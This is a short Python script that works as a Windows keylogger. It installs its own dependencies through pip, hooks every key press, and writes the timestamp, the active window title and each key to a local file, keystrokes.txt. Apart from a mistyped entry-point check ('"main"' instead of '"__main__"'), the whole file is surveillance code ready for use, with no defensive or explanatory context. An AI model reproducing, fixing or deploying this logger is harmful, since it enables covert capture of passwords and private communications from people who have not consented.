import subprocess
from datetime import datetime

log_file = 'keystrokes.txt'
dependencies = ['keyboard', 'pywin32']

def install_dependencies(dependencies):
    for package in dependencies:
        subprocess.run(['pip', 'install', package], check=True)


def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd)
    except:
        return "null"


def on_key_press(event):
    win_title = get_active_window_title()
    _time = datetime.now().strftime("%d:%m:%y %H:%M:%S")
    with open(log_file, 'a') as f:
        f.write(f'[{_time}];[{win_title}];[{event.name}];\n')


def run():
    keyboard.on_press(on_key_press)
    keyboard.wait()

if __name__ == "main":
    install_dependencies(dependencies)

    import win32gui
    import keyboard

    run()
